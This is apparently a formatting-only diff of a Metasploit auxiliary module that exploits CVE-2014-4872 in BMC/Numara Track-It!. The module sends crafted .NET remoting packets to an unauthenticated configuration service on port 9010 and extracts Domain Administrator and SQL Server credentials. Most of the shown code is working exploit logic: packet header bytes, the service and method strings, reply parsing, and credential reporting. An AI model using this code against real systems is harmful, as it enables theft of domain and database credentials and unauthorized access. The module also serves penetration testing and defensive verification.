@@ -10,36 +10,42 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'BMC / Numara Track-It! Domain Administrator and SQL Server User Password Disclosure',
-      'Description' => %q{
-        This module exploits an unauthenticated configuration retrieval .NET remoting
-        service in Numara / BMC Track-It! v9 to v11.X, which can be abused to retrieve the Domain
-        Administrator and the SQL server user credentials.
-        This module has been tested successfully on versions 11.3.0.355, 10.0.51.135, 10.0.50.107,
-        10.0.0.143 and 9.0.30.248.
-      },
-      'Author' =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'BMC / Numara Track-It! Domain Administrator and SQL Server User Password Disclosure',
+        'Description' => %q{
+          This module exploits an unauthenticated configuration retrieval .NET remoting
+          service in Numara / BMC Track-It! v9 to v11.X, which can be abused to retrieve the Domain
+          Administrator and the SQL server user credentials.
+          This module has been tested successfully on versions 11.3.0.355, 10.0.51.135, 10.0.50.107,
+          10.0.0.143 and 9.0.30.248.
+        },
+        'Author' => [
           'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
         ],
-      'License' => MSF_LICENSE,
-      'References' =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2014-4872' ],
           [ 'OSVDB', '112741' ],
           [ 'US-CERT-VU', '121036' ],
           [ 'URL', 'https://seclists.org/fulldisclosure/2014/Oct/34' ]
         ],
-      'DisclosureDate' => '2014-10-07'
-    ))
+        'DisclosureDate' => '2014-10-07',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
     register_options(
       [
         OptPort.new('RPORT',
-          [true, '.NET remoting service port', 9010])
-      ])
+                    [true, '.NET remoting service port', 9010])
+      ]
+    )
   end
-
 
   def prepare_packet(bmc)
     #
@@ -71,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
     # - DomainAdminUserName
     # - DomainAdminEncryptedPassword
     #
-    packet_header_pre_packet_size= [
+    packet_header_pre_packet_size = [
       0x2e, 0x4e, 0x45, 0x54, 0x01, 0x00, 0x00, 0x00,
       0x00, 0x00
     ]
@@ -105,9 +111,9 @@ class MetasploitModule < Msf::Auxiliary
 
     @packet_terminator = [ 0x0b ]
 
-    service = "TrackIt.Core.ConfigurationService".gsub(/TrackIt/,(bmc ? "Trackit" : "Numara.TrackIt"))
-    method = "GetProductDeploymentValues".gsub(/TrackIt/,(bmc ? "Trackit" : "Numara.TrackIt"))
-    type = "TrackIt.Core.Configuration.IConfigurationSecureDelegator, TrackIt.Core.Configuration, Version=11.3.0.355, Culture=neutral, PublicKeyToken=null".gsub(/TrackIt/,(bmc ? "TrackIt" : "Numara.TrackIt"))
+    service = "TrackIt.Core.ConfigurationService".gsub(/TrackIt/, (bmc ? "Trackit" : "Numara.TrackIt"))
+    method = "GetProductDeploymentValues".gsub(/TrackIt/, (bmc ? "Trackit" : "Numara.TrackIt"))
+    type = "TrackIt.Core.Configuration.IConfigurationSecureDelegator, TrackIt.Core.Configuration, Version=11.3.0.355, Culture=neutral, PublicKeyToken=null".gsub(/TrackIt/, (bmc ? "TrackIt" : "Numara.TrackIt"))
 
     uri = "tcp://" + rhost + ":" + rport.to_s + "/" + service
 
@@ -154,15 +160,15 @@ class MetasploitModule < Msf::Auxiliary
     return buf
   end
 
-
   def fill_loot_from_packet(packet_reply, loot)
     loot.each_key { |str|
       if loot[str] != nil
         next
       end
+
       if (index = (packet_reply.index(str))) != nil
         # after str, discard 5 bytes then get str_value
-        size = packet_reply[index + str.length + 5,1].unpack('C*')[0]
+        size = packet_reply[index + str.length + 5, 1].unpack('C*')[0]
         if size == 255
           # if we received 0xFF then there is no value for this str
           # set it to empty but not nil so that we don't look for it again
@@ -173,7 +179,6 @@ class MetasploitModule < Msf::Auxiliary
       end
     }
   end
-
 
   def run
     packet = prepare_packet(true)
@@ -290,13 +295,13 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       credential_core = report_credential_core({
-         password: loot[database_pw],
-         username: loot[schema_owner],
-         sid: sid
-       })
+        password: loot[database_pw],
+        username: loot[schema_owner],
+        sid: sid
+      })
 
       # Get just the hostname
-      db_address= loot[database_server_name].split('\\')[0]
+      db_address = loot[database_server_name].split('\\')[0]
 
       begin
         database_login_data = {
@@ -334,8 +339,7 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-
-  def report_credential_core(cred_opts={})
+  def report_credential_core(cred_opts = {})
     # Set up the has for our Origin service
     origin_service_data = {
       address: rhost,
@@ -360,9 +364,9 @@ class MetasploitModule < Msf::Auxiliary
       })
     elsif cred_opts[:sid]
       credential_data.merge!({
-         realm_key: Metasploit::Model::Realm::Key::ORACLE_SYSTEM_IDENTIFIER,
-         realm_value: cred_opts[:sid]
-       })
+        realm_key: Metasploit::Model::Realm::Key::ORACLE_SYSTEM_IDENTIFIER,
+        realm_value: cred_opts[:sid]
+      })
     end
 
     credential_data.merge!(origin_service_data)
